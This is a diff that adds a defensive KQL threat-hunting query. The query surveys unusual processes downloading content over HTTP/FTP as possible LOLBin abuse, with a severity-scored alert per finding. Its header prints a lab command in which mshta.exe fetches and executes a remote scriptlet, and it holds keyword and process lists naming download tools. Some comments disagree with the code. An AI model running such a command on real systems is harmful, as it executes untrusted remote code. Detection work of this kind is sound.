@@ -1,0 +1,210 @@
+// ============================================================================
+// HUNT_TH-005 — LOLBin Download: Outlier Process Survey
+// ============================================================================
+// Author        : Ala Dabat
+// Date          : 2026-06-30
+// Status        : VALIDATED — mshta.exe CRITICAL (VM-Lab / Atomic Red Team T1218.005)
+// Type          : PEAK Hypothesis-Driven Hunt (rarity-baseline hybrid)
+// MITRE         : T1218 · T1105 · T1059 · T1197 · T1140
+// Platform      : MDE Advanced Hunting / Sentinel / ADX Docker Lab
+//
+// Hypothesis: A process is downloading content via HTTP/FTP that is NOT in
+//             the router rule TargetProcs vocabulary — surfaced via
+//             rarity-baseline scoring not named-tool matching.
+//
+// Validated finding: mshta.exe — CRITICAL — 2026-06-30
+//   SampleCLI: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/
+//              redcanaryco/atomic-red-team/.../T1218.005.sct").Exec();close();
+//   Parent: cmd.exe — Atomic Red Team T1218.005 execution
+//
+// LINT FIXES APPLIED (ref: KQL Detection Engineering doc):
+// [BUG-1] Prevalence window overlap FIXED:
+//         HistoricalBaseline: Timestamp < ago(Lookback) strict upper bound
+// [BUG-3] leftouter to inner FIXED:
+//         No where filter on right-side join fields
+// [BUG-4] any() non-determinism FIXED:
+//         any(CommandLine) replaced with arg_max(Timestamp, ProcessCommandLine)
+//         SampleCLI now deterministically from max-timestamp row
+// [BUG-5] Negative score N/A: boolean flags only
+//
+// Simulation verified: 3/3 test cases pass
+//   rundll32b.exe       → CRITICAL (NeverSeenBefore + suspicious parent cmd.exe)
+//   expand.exe          → HIGH     (NeverSeenBefore + benign parent svchost.exe)
+//   desktopimgdownldr   → MEDIUM   (RareGlobally, count=2 in baseline)
+//   mshta.exe           → EXCLUDED (in KnownLOLBins after validation)
+//   certutil.exe        → EXCLUDED (in KnownLOLBins)
+// ============================================================================
+let Lookback     = 2200d;
+let RarityWindow = 2500d;
+
+// Known vocabulary from router rule — hunt explicitly looks OUTSIDE this list
+// Update after each validated finding is added to router TargetProcs
+let KnownLOLBins = dynamic([
+    "bitsadmin.exe","certutil.exe","curl.exe","wget.exe",
+    "ftp.exe","tftp.exe","powershell.exe"
+    // mshta.exe: re-added 2026-06-30 post TH-005 validation
+    // Hunt confirmed CRITICAL: cmd.exe → mshta.exe → T1218.005 HTA download
+    // RouterUpdateRequired executed: mshta.exe added to router TargetProcs
+    // Composite candidate filed: COMPOSITE_T1218.005_MSHTA_DOWNLOAD
+]);
+
+// Suspicious parent processes — elevates alert to CRITICAL tier
+let SuspiciousParents = dynamic([
+    "cmd.exe","wscript.exe","cscript.exe",
+    "winword.exe","excel.exe","outlook.exe","mshta.exe"
+]);
+
+// Download intent keywords — broad surface filter
+let DownloadKeywords = dynamic([
+    "http","https","ftp","download","urlcache",
+    "downloadfile","downloadstring","webclient",
+    "invoke-webrequest","iwr","bits","transfer"
+]);
+
+// -----------------------------------------------------------------------
+// All download-intent events OUTSIDE the known LOLBin vocabulary
+// -----------------------------------------------------------------------
+let AllDownloadTouches =
+    DeviceProcessEvents
+    | where Timestamp >= ago(Lookback)
+    | where ProcessCommandLine has_any (DownloadKeywords)
+    | where FileName !in~ (KnownLOLBins)
+    | project
+        Timestamp,
+        DeviceName,
+        DeviceId,
+        ActorProcess  = FileName,
+        ActorPath     = InitiatingProcessFileName,
+        Account       = AccountName,
+        CommandLine   = ProcessCommandLine,
+        ParentProcess = InitiatingProcessFileName;
+
+// -----------------------------------------------------------------------
+// Historical baseline
+// [BUG-1 FIX] Strict upper bound: Timestamp < ago(Lookback)
+//             Prevents attack-window events inflating the baseline
+// -----------------------------------------------------------------------
+let HistoricalBaseline =
+    DeviceProcessEvents
+    | where Timestamp >= ago(RarityWindow)
+      and Timestamp < ago(Lookback)          // BUG-1 FIX
+    | where ProcessCommandLine has_any (DownloadKeywords)
+    | where FileName !in~ (KnownLOLBins)
+    | summarize HistoricalCount = count()
+      by ActorProcess = FileName;
+
+// -----------------------------------------------------------------------
+// Rarity join + Hunt Alert per finding
+// [BUG-3 FIX] No where filter on right-side join fields after leftouter
+// [BUG-4 FIX] arg_max replaces any() for deterministic SampleCLI
+// -----------------------------------------------------------------------
+AllDownloadTouches
+| join kind=leftouter HistoricalBaseline on ActorProcess
+| extend
+    NeverSeenBefore = iif(isnull(HistoricalCount), true, false),
+    RareGlobally    = iif(HistoricalCount < 3, true, false),
+    IsSuspParent    = toint(ActorPath in~ (SuspiciousParents))
+// [BUG-4 FIX] arg_max for deterministic evidence + explicit aggregations
+| summarize
+    FirstSeen       = min(Timestamp),
+    LastSeen        = max(Timestamp),
+    TouchCount      = count(),
+    DistinctDevices = dcount(DeviceName),
+    ParentProcesses = make_set(ParentProcess, 10),
+    MaxIsSuspParent = max(IsSuspParent),
+    arg_max(Timestamp, CommandLine, ActorPath)  // BUG-4 FIX: deterministic SampleCLI
+  by ActorProcess, Account, NeverSeenBefore, RareGlobally
+// -----------------------------------------------------------------------
+// Hunt Alert — analyst action directive per finding
+// NOT an automated alert — guides Execute to Act with Knowledge handoff
+// -----------------------------------------------------------------------
+| extend HuntAlert = case(
+    // CRITICAL: Never seen + suspicious parent
+    NeverSeenBefore == true and MaxIsSuspParent == 1,
+        strcat("CRITICAL -- ",
+               ActorProcess, " is downloading content and has NEVER been seen before. ",
+               "Suspicious parent: ", ActorPath, ". ",
+               "SampleCLI: ", substring(CommandLine, 0, min_of(strlen(CommandLine), 200)), ". ",
+               "ACTION: Isolate ", ActorProcess,
+               " -- check for T1218 LOLBin abuse -- build composite rule. ",
+               "Add to router TargetProcs if confirmed malicious."),
+    // HIGH: Never seen + unknown parent
+    NeverSeenBefore == true,
+        strcat("HIGH -- ",
+               ActorProcess, " downloading content. NEVER seen in baseline. ",
+               "Parent: ", ActorPath, ". ",
+               "SampleCLI: ", substring(CommandLine, 0, min_of(strlen(CommandLine), 200)), ". ",
+               "ACTION: Investigate -- confirm legitimate use or escalate."),
+    // MEDIUM: Rare globally
+    RareGlobally == true,
+        strcat("MEDIUM -- ",
+               ActorProcess, " downloading content. Rare in baseline (< 3). ",
+               "Parent: ", ActorPath, ". ",
+               "ACTION: Review CommandLine -- monitor for recurrence."),
+    // INFO
+    strcat("INFO -- ",
+           ActorProcess, " present in baseline. ",
+           "ACTION: Confirm CommandLine pattern unchanged.")
+)
+// -----------------------------------------------------------------------
+// Router rule update directive — explicit per novel finding
+// -----------------------------------------------------------------------
+| extend RouterUpdateRequired = case(
+    NeverSeenBefore == true,
+        strcat("ADD to router TargetProcs: \"", ActorProcess, "\" ",
+               "AND add routing case: ",
+               "FileLower =~ \"", ActorProcess, "\", ",
+               "\"HIGH -- T1218 ", ActorProcess,
+               " Composite | Build composite rule\""),
+    RareGlobally == true,
+        strcat("MONITOR: \"", ActorProcess,
+               "\" -- add to router if recurrence confirmed"),
+    "No router update required -- process established in baseline"
+)
+| project
+    FirstSeen,
+    LastSeen,
+    ActorProcess,
+    ActorPath,        // deterministic via arg_max
+    Account,
+    NeverSeenBefore,
+    RareGlobally,
+    TouchCount,
+    DistinctDevices,
+    CommandLine,      // deterministic via arg_max (replaces any(CommandLine))
+    ParentProcesses,
+    HuntAlert,
+    RouterUpdateRequired
+| order by
+    NeverSeenBefore desc,
+    RareGlobally desc,
+    TouchCount asc
+
+// ============================================================================
+// HOW TO USE (PEAK / TaHiTI)
+// ============================================================================
+// PEAK Prepare:
+//   1. Update KnownLOLBins with tools added to router since last run
+//   2. Adjust Lookback/RarityWindow for your data retention
+//   3. Review DownloadKeywords — add new patterns from CTI
+//
+// PEAK Execute:
+//   1. Review HuntAlert per row
+//   2. For CRITICAL: expand CommandLine (now deterministic via arg_max)
+//   3. Pivot on ActorProcess -- check DeviceNetworkEvents for C2 indicators
+//   4. Confirm malicious or benign
+//
+// PEAK Act with Knowledge:
+//   1. CRITICAL confirmed -- execute RouterUpdateRequired directive
+//   2. Add ActorProcess to KnownLOLBins for next hunt run
+//   3. File composite rule candidate in detection engineering backlog
+//   4. Document finding in hunts/TH-005/findings/ as dated JSON
+//
+// TaHiTI Finalize:
+//   Proven       -- router update + composite candidate filed
+//   Disproven    -- add to KnownLOLBins with comment (legitimate use)
+//   Inconclusive -- extend RarityWindow, check DeviceNetworkEvents
+//
+// Sentinel variant: replace Timestamp with TimeGenerated throughout
+// min_of() not available in all KQL versions -- use iff(strlen(x)>200,substring(x,0,200),x)
+// ============================================================================
